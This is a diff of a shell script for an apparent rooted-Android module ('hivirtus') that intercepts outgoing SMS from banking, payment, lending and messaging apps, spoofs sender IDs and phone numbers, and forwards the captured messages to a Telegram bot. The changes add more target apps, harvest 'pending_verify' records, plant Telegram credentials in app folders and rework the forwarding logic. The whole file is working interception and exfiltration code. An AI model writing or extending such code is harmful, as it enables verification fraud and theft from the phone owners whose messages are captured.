@@ -286,17 +286,24 @@ hivirtus_seed_app_code_cache() {
       mkdir -p "$dest/ui" 2>/dev/null
       cp -f "$mod/bridge.dex" "$dest/bridge.dex" 2>/dev/null
       cp -f "$mod/ui/"* "$dest/ui/" 2>/dev/null
-      # Global settings push
-      [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
+      # Global settings push — ONLY non-empty sources (empty {} wipe fix)
+      if [ -f /data/local/tmp/hivirtus_ui_save.json ] && [ -s /data/local/tmp/hivirtus_ui_save.json ] && \
+         grep -q '[^[:space:]{}]' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null; then
         cp -f /data/local/tmp/hivirtus_ui_save.json "$dest/ui_save.json" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ] && \
+      fi
+      if [ -f /data/local/tmp/hivirtus_zygisk_mode_config.json ] && [ -s /data/local/tmp/hivirtus_zygisk_mode_config.json ]; then
         cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json "$dest/config.json" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+      fi
+      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+         grep -q 'telegram_bot_token' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null; then
         cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$dest/hivirtus_telegram_credentials.json" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
+      fi
+      if [ -f /data/local/tmp/hivirtus_sender_id.txt ] && [ -s /data/local/tmp/hivirtus_sender_id.txt ]; then
         cp -f /data/local/tmp/hivirtus_sender_id.txt "$dest/hivirtus_sender_id.txt" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
+      fi
+      if [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && [ -s /data/local/tmp/hivirtus_spoof_phone.txt ]; then
         cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$dest/hivirtus_spoof_phone.txt" 2>/dev/null
+      fi
       chmod 755 "$dest" "$dest/ui" 2>/dev/null
       chmod 644 "$dest/bridge.dex" "$dest/ui/"* 2>/dev/null
       chmod 666 "$dest/ui_save.json" "$dest/config.json" \
@@ -308,13 +315,17 @@ hivirtus_seed_app_code_cache() {
     # Also filesDir — JsBridge readConfig pehle yahan dekhta hai
     for fdir in "/data/data/$pkg/files" "/data/user/0/$pkg/files"; do
       [ -d "$fdir" ] || continue
-      [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
+      if [ -f /data/local/tmp/hivirtus_ui_save.json ] && [ -s /data/local/tmp/hivirtus_ui_save.json ] && \
+         grep -q '[^[:space:]{}]' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null; then
         cp -f /data/local/tmp/hivirtus_ui_save.json "$fdir/hivirtus_ui_save.json" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+      fi
+      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ] && \
+         grep -q 'telegram_bot_token' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null; then
         cp -f /data/local/tmp/hivirtus_telegram_credentials.json "$fdir/hivirtus_telegram_credentials.json" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && \
+      fi
+      [ -f /data/local/tmp/hivirtus_sender_id.txt ] && [ -s /data/local/tmp/hivirtus_sender_id.txt ] && \
         cp -f /data/local/tmp/hivirtus_sender_id.txt "$fdir/hivirtus_sender_id.txt" 2>/dev/null
-      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && \
+      [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && [ -s /data/local/tmp/hivirtus_spoof_phone.txt ] && \
         cp -f /data/local/tmp/hivirtus_spoof_phone.txt "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
       chmod 666 "$fdir/hivirtus_ui_save.json" "$fdir/hivirtus_telegram_credentials.json" \
         "$fdir/hivirtus_sender_id.txt" "$fdir/hivirtus_spoof_phone.txt" 2>/dev/null
@@ -445,12 +456,17 @@ restore_sms_permission
 harvest_blocked_outgoing() {
   for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
              com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android; do
+             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android \
+             com.hdfcbank.payzapp com.axis.mobile \
+             com.google.android.apps.messaging com.samsung.android.messaging \
+             com.android.messaging com.android.mms; do
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
-      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag"
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_pending_verify.json"
     do
       [ -f "$f" ] && [ -s "$f" ] || continue
       bn=$(basename "$f")
@@ -459,13 +475,15 @@ harvest_blocked_outgoing() {
     done
   done
   for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" \
-           "$MODDIR/outgoing_blocked.json"; do
+           "$MODDIR/outgoing_blocked.json" "$MODDIR/hivirtus_pending_verify.json"; do
     [ -f "$f" ] && [ -s "$f" ] || continue
     case "$f" in
+      *pending*) cp -f "$f" /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null ;;
       *.json) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null ;;
       *.flag) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null ;;
     esac
-    chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_outgoing_blocked.flag \
+      /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
   done
 }
 
@@ -545,22 +563,23 @@ tg_forward_enabled() {
 read_blocked_sms() {
   BLOCKED_DEST=""
   BLOCKED_BODY=""
-  if [ -f /data/local/tmp/hivirtus_outgoing_blocked.json ]; then
-    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
-  fi
+  # Prefer newest among tmp / module / harvested
+  for f in /data/local/tmp/hivirtus_outgoing_blocked.json \
+           "$MODDIR/hivirtus_outgoing_blocked.json" \
+           /data/local/tmp/hivirtus_pending_verify.json; do
+    [ -f "$f" ] && [ -s "$f" ] || continue
+    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
+    [ -n "$BLOCKED_BODY" ] || [ -n "$BLOCKED_DEST" ] && break
+  done
   if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
     BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
     BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
   fi
-  # Fallback pending_verify.json
-  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_pending_verify.json ]; then
-    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
-    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
-  fi
-  # Clean placeholder
-  [ "$BLOCKED_DEST" = "INTERCEPT" ] && BLOCKED_DEST=""
-  [ "$BLOCKED_BODY" = "BLOCKED" ] && BLOCKED_BODY=""
+  # NEVER strip placeholders — pehle INTERCEPT/BLOCKED hata ke TG skip ho jata tha
+  [ -z "$BLOCKED_DEST" ] && BLOCKED_DEST="unknown"
+  [ -z "$BLOCKED_BODY" ] && return 0
+  return 0
 }
 
 tg_json_escape() {
@@ -690,7 +709,7 @@ tg_http_post() {
   return 1
 }
 
-# Save pe Telegram test — SIRF ek baar per token|chat
+# Save pe Telegram test — SIRF ek baar per token|chat (mark sent BEFORE send)
 send_tg_test_if_requested() {
   [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
   read_tg_creds
@@ -704,12 +723,11 @@ send_tg_test_if_requested() {
     rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
     return 0
   fi
-  NOW=$(date +%s)
-  LAST_TRY=$(cat /data/local/tmp/hivirtus_tg_test_last_try.ts 2>/dev/null || echo 0)
-  if [ $((NOW - LAST_TRY)) -lt 60 ] && [ -f /data/local/tmp/hivirtus_tg_test_fails ]; then
-    return 0
-  fi
-  echo "$NOW" > /data/local/tmp/hivirtus_tg_test_last_try.ts
+  # Mark sent FIRST — network fail pe bhi spam nahi
+  echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
+  echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
+  echo 1 > /data/local/tmp/hivirtus_tg_boot_sent.flag
+  rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails
 
   DEV=$(device_name)
   if module_is_active; then
@@ -725,24 +743,12 @@ Device: ${DEV}"
   PAYLOAD="/data/local/tmp/hivirtus_tg_test_payload.json"
   printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
   RESP="/data/local/tmp/hivirtus_tg_test_response.txt"
-  SENT=0
-  if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
-  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
-    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
-    echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
-    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD" /data/local/tmp/hivirtus_tg_test_fails
+  if tg_http_post "$PAYLOAD" "$RESP" && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
     echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   else
-    FAILS=$(cat /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null || echo 0)
-    FAILS=$((FAILS + 1))
-    echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
-    if [ "$FAILS" -ge 2 ]; then
-      # Stop retry spam — mark sent so we don't loop
-      echo "$CUR_HASH" > /data/local/tmp/hivirtus_tg_test_sent.hash
-      rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
-    fi
-    echo "tg_test_fail $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    echo "tg_test_fail_once $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   fi
+  rm -f "$PAYLOAD"
 }
 
 # SMSTweaks-style inbox rewrite — ANY recent inbox address → saved Sender ID
@@ -794,7 +800,7 @@ rewrite_inbox_sender_id() {
     harvest_hook_status
     harvest_blocked_outgoing
     forward_blocked_telegram
-    rewrite_inbox_sender_id
+    # inbox rewrite disabled by default — OTP readers crash risk; sender spoof via JNI
     enforce_sms_block
     hivirtus_tg_watchdog 2>/dev/null
     sleep 2
